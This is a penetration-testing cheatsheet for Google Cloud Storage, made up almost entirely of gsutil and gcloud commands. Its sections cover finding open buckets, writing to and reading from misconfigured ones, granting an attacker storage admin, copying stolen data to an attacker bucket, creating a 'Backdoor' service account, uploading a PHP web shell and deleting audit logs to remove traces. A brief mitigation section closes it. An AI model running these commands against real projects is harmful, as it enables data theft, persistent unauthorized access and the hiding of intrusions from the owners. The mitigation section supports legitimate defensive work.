# Google Cloud Storage (GCS) Penetration Testing Cheatsheet

## 1. Enumeration & Discovery

### 1.1 Identify Publicly Accessible Buckets
```sh
# Search for open buckets via Google Dorking
site:storage.googleapis.com
site:console.cloud.google.com/storage/browser/
```

```sh
# Check if a specific bucket exists (No authentication required)
gsutil ls gs://BUCKET_NAME
```

```sh
# Enumerate buckets in a project (requires permissions)
gcloud storage buckets list --project PROJECT_ID
```

### 1.2 Identify Publicly Accessible Objects
```sh
# List objects inside a bucket
gsutil ls gs://BUCKET_NAME/
```

```sh
# Check object permissions
gsutil acl get gs://BUCKET_NAME/OBJECT_NAME
```

```sh
# Check public objects with CURL
curl -I https://storage.googleapis.com/BUCKET_NAME/OBJECT_NAME
```

### 1.3 Check IAM Policies
```sh
# Check bucket IAM permissions
gcloud storage buckets get-iam-policy BUCKET_NAME
```

```sh
# Check object IAM permissions
gcloud storage objects get-iam-policy gs://BUCKET_NAME/OBJECT_NAME
```

```sh
# Identify who has access
gcloud projects get-iam-policy PROJECT_ID
```

## 2. Exploiting Misconfigurations

### 2.1 Access Control Misconfigurations
```sh
# Check if bucket allows allUsers or allAuthenticatedUsers
gcloud storage buckets get-iam-policy BUCKET_NAME | grep "allUsers"
```

```sh
# Exploit publicly writable bucket
echo "Hacked!" > hacked.txt
gsutil cp hacked.txt gs://BUCKET_NAME/
```

```sh
# Exploit publicly readable objects
gsutil cp gs://BUCKET_NAME/OBJECT_NAME .
```

### 2.2 Default Storage Class Enumeration
```sh
# Check bucket storage class
gcloud storage buckets describe BUCKET_NAME --format="value(storageClass)"
```

### 2.3 Versioning Enumeration & Restoration
```sh
# Check if versioning is enabled
gcloud storage buckets describe BUCKET_NAME --format="value(versioning)"
```

```sh
# List object versions
gsutil ls -a gs://BUCKET_NAME/OBJECT_NAME
```

```sh
# Restore old version of an object
gsutil cp gs://BUCKET_NAME/OBJECT_NAME#VERSION_ID .
```

## 3. Privilege Escalation

### 3.1 Abusing Roles & Permissions
```sh
# List roles assigned to user
gcloud projects get-iam-policy PROJECT_ID --flatten="bindings[].members" --format='table(bindings.role)'
```

```sh
# Check if user has storage admin role
gcloud projects get-iam-policy PROJECT_ID | grep roles/storage.admin
```

```sh
# Escalate privileges by modifying IAM policy
gcloud storage buckets add-iam-policy-binding BUCKET_NAME --member=user:ATTACKER@EMAIL.COM --role=roles/storage.admin
```

## 4. Data Exfiltration

### 4.1 Download All Publicly Accessible Data
```sh
# Download all objects from an open bucket
gsutil -m cp -r gs://BUCKET_NAME/ ./dump/
```

```sh
# Transfer stolen data to another bucket
gsutil cp gs://VICTIM_BUCKET/OBJECT_NAME gs://ATTACKER_BUCKET/
```

### 4.2 Enumerate Sensitive Data in Objects
```sh
# Search for secrets in downloaded objects
grep -rE "(api_key|password|secret)" ./dump/
```

## 5. Persistence Techniques

### 5.1 Creating a New Service Account
```sh
# Create a new service account
gcloud iam service-accounts create ATTACKER_ACCOUNT --display-name "Backdoor"
```

```sh
# Assign Storage Admin permissions to attacker account
gcloud projects add-iam-policy-binding PROJECT_ID --member serviceAccount:ATTACKER_ACCOUNT@PROJECT_ID.iam.gserviceaccount.com --role roles/storage.admin
```

### 5.2 Uploading a Malicious Object
```sh
# Upload a web shell or malicious script
echo "<?php system($_GET['cmd']); ?>" > shell.php
gsutil cp shell.php gs://BUCKET_NAME/
```

## 6. Post-Exploitation & Cleanup

### 6.1 Remove Traces
```sh
# Delete logs
gcloud logging logs delete projects/PROJECT_ID/logs/cloudstorage.googleapis.com%2Factivity
```

```sh
# Remove attacker account
gcloud iam service-accounts delete ATTACKER_ACCOUNT@PROJECT_ID.iam.gserviceaccount.com
```

### 6.2 Delete Compromised Buckets & Objects
```sh
# Remove objects
gsutil rm gs://BUCKET_NAME/OBJECT_NAME
```

```sh
# Remove entire bucket
gsutil rb gs://BUCKET_NAME/
```

## 7. Defense & Mitigation

### 7.1 Restrict IAM Policies
- Avoid granting `roles/storage.admin` broadly.
- Remove `allUsers` and `allAuthenticatedUsers` from IAM policies.

### 7.2 Enable Logging & Monitoring
```sh
# Enable Cloud Audit Logging
gcloud logging sinks create my-sink storage.googleapis.com/BUCKET_NAME --log-filter='resource.type="gcs_bucket"'
```

### 7.3 Enable Object Versioning
```sh
# Enable versioning to track unauthorized changes
gcloud storage buckets update BUCKET_NAME --versioning
```

### 7.4 Restrict Public Access
```sh
# Make bucket private
gsutil iam ch -d allUsers gs://BUCKET_NAME
```

### 7.5 Rotate Keys Regularly
```sh
# Rotate service account keys
gcloud iam service-accounts keys create --iam-account=ACCOUNT@PROJECT_ID.iam.gserviceaccount.com new-key.json
```
